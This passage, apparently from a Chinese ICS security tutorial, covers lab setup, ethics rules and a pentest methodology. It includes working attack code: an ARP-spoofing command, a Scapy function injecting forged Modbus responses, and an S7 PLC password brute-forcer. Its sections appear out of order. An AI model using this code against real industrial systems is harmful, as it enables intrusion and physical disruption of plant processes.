# 实践建议与注意事项

### 8.1 学习建议

1. **先学习工控基础知识**：了解 PLC、SCADA、工业协议
2. **从协议分析入手**：掌握 Wireshark 抓包和协议分析
3. **搭建实验环境**：使用模拟器和虚拟环境练习
4. **学习编程**：Python + Scapy，自己写测试脚本
5. **关注漏洞情报**：跟踪 ICS-CERT、CNVD 等漏洞公告

### 8.2 实验环境搭建

**低成本方案：**
- 虚拟机 + 各种模拟器
- Modbus 模拟器（Modbus Slave）
- OPC UA 模拟器
- 树莓派 + 开源 PLC 软件

**中等成本方案：**
- 二手入门级 PLC（S7-200 SMART、FX3U 等）
- 工业交换机
- 真实 HMI 软件

### 8.3 道德与法律红线

**绝对不能做的事：**
- 未经授权扫描任何工控系统
- 未经授权访问任何工控设备
- 对生产系统进行任何测试
- 发布或传播工控漏洞利用代码
- 利用工控漏洞进行非法活动

**正确的做法：**
- 在授权范围内进行测试
- 及时向厂商报告漏洞
- 遵守负责任披露原则
- 只用于防护目的

**Modbus 中间人攻击（MITM）：**

```python
# 使用 Ettercap 进行ARP欺骗（仅用于授权测试）
# ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1//

# 使用 Scapy 构造Modbus注入数据包
from scapy.all import *
from scapy.contrib.modbus import *

# 构造恶意Modbus响应包（用于MITM场景）
def inject_modbus_response(target_ip, attacker_ip, register_values):
    pkt = IP(src=attacker_ip, dst=target_ip)/TCP(sport=502, dport=50000, flags='PA')
    pkt /= ModbusADU(transId=1, unitId=1)
    pkt /= ModbusPDU03ReadHoldingRegistersPayload(
        registerVal=register_values
    )
    send(pkt, verbose=0)
```

**S7 密码破解：**
```python
# S7 PLC 保护级别密码暴力破解（仅用于授权测试）
import snap7

def crack_s7_password(ip, rack, slot, wordlist):
    client = snap7.client.Client()
    client.connect(ip, rack, slot)
    
    with open(wordlist, 'r') as f:
        for password in f:
            password = password.strip()
            try:
                # 尝试设置会话权限（保护级别3）
                client.set_session_password(3, password.encode())
                print(f"[+] 密码找到: {password}")
                return True
            except:
                print(f"[-] 尝试失败: {password}")
                continue
    
    client.disconnect()
    return False
```

### 五、工控渗透测试方法学

#### 5.1 标准测试流程

```
阶段一：授权与规划
  ├── 获取书面授权
  ├── 确定测试范围（IP/网段/设备类型）
  ├── 制定测试计划（时间窗口/应急方案）
  └── 签署保密协议(NDA)

阶段二：信息收集（被动）
  ├── 开源情报(OSINT)收集
  │   ├── Shodan/Censys/Fofa
  │   ├── 厂商官网/产品手册
  │   ├── 漏洞数据库（CVE/CNVD/ICS-CERT）
  │   └── 技术论坛/博客/GitHub
  └── 网络架构分析
      ├── 网络拓扑图
      ├── 设备清单
      └── 安全控制措施

阶段三：信息收集（主动）
  ├── 端口扫描与服务识别
  ├── 协议探测与指纹识别
  ├── 设备型号与固件版本确认
  └── 漏洞初步匹配

阶段四：漏洞验证与利用
  ├── 协议层漏洞测试
  │   ├── 认证绕过
  │   ├── 未授权访问
  │   ├── 输入验证
  │   └── 拒绝服务
  ├── 应用层漏洞测试
  │   ├── HMI Web漏洞
  │   ├── SCADA软件漏洞
  │   └── 工程工作站漏洞
  └── 设备层漏洞测试
      ├── 固件漏洞
      ├── 配置漏洞
      └── 默认凭据

阶段五：横向移动
  ├── 工控网络内部探测
  ├── 利用协议信任关系
  ├── 跳板攻击
  └── 权限提升

阶段六：报告与清理
  ├── 详细测试报告
  ├── 漏洞风险评级
  ├── 修复建议
  └── 清理测试痕迹
```

#### 5.2 工控渗透测试注意事项

```markdown
【绝对禁止】
- 对生产系统进行拒绝服务(DoS)测试
- 写入/修改PLC寄存器或程序
- 停止/启动PLC运行
- 删除/修改工控系统配置
- 上传恶意程序到工控设备

【谨慎进行】
- 仅读取操作（读寄存器/读数据块）
- 低速扫描（限制速率，避免影响设备）
- 在维护窗口内进行
- 有现场工程师值守
- 准备应急回滚方案

【推荐做法】
- 优先使用被动流量分析
- 使用模拟器验证漏洞
- 分阶段测试，逐步深入
- 详细记录所有操作
- 发现高危问题立即报告
```
